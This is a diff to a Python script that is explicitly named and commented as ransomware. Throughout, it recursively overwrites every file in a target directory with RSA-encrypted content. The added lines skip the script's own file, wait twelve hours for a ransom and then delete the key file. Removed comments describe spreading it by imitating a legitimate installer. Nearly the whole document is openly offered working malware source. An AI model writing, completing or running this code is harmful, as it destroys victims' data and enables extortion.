@@ -1,68 +1,59 @@
-# import libraries 
-import os # for file operations
-import sys # for command line arguments
-import time # for timing the program
-from Crypto.PublicKey import RSA #for encryption
-from Crypto.Cipher import PKCS1_OAEP #for creating a cipher 
-
-
-# we want to create a ransomware that will encrypt a given directory and all of its subdirectories recursively
-# ideally, we want to encrypt all files except for the ransomware itself
-# we want to infect the system by mocking a legitimate program that requires installation of an exe file
-
-# start the attack by asking a user for a directory to encrypt
-# we will use the command line arguments to get the directory to encrypt
-
+import os
+import sys
+import time
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 def encrypt_file(file_path, public_key):
-    with open(file_path, 'rb') as original_file:
-        original_content = original_file.read()
+    try:
+        with open(file_path, 'rb') as original_file:
+            original_content = original_file.read()
 
-    key = RSA.import_key(public_key)
-    cipher = PKCS1_OAEP.new(key)
-    encrypted_content = cipher.encrypt(original_content)
+        key = RSA.import_key(public_key)
+        cipher = PKCS1_OAEP.new(key)
+        encrypted_content = cipher.encrypt(original_content)
 
-    with open(file_path, 'wb') as encrypted_file:
-        encrypted_file.write(encrypted_content)
+        with open(file_path, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted_content)
+        print(f"Encrypted: {file_path}")
+    except Exception as e:
+        print(f"Error encrypting {file_path}: {e}")
 
-
-def encrypt_directory(directory, public_key):
+def encrypt_directory(directory, public_key, ransomware_path):
     for root, dirs, files in os.walk(directory):
-        print(f"Scanning directory: {root}")
-        
-        for dir in dirs:
-            dir_path = os.path.join(root,dir)
-            print(f"Found directories: {dir_path}")
-
         for file in files:
             file_path = os.path.join(root, file)
-            print(f"Found file: {file_path}")
+            
+            # Skip the ransomware file
+            if file_path == ransomware_path:
+                continue
 
             encrypt_file(file_path, public_key)
 
-    
-#We use the directory passed from the command
+# Check for command line arguments
+print(sys.argv)
+if len(sys.argv) < 2:
+    print("Usage: python ransomware.py <directory>")
+    sys.exit(1)
+
+# We use the directory passed from the command
 directory = sys.argv[1]
+
+# Check if the directory exists
+if not os.path.exists(directory):
+    print("Directory does not exist")
+    sys.exit(1)
+
+# Path to the ransomware script itself
+ransomware_path = os.path.abspath(sys.argv[0])
 
 with open('publicKey.pem', 'rb') as pub:
     key = pub.read()
 
+encrypt_directory(directory, key, ransomware_path)
 
-# # we will use the command line arguments to get the directory to encrypt
-if len(sys.argv) < 2:
-     print("Usage: python3 ransomware.py <directory>")
-     sys.exit(1)
+# user only has 12 hours to pay the ransom and enter the key before the key is deleted and the files are lost forever
+time.sleep(43200)
 
-# # if the directory does not exist, we will exit the program
-if not os.path.exists(directory):
-     print("Directory does not exist")
-     sys.exit(1)
-
-
-encrypt_directory(directory,key)
-
-
-
-
-
-
+# delete the key
+os.remove('publicKey.pem')
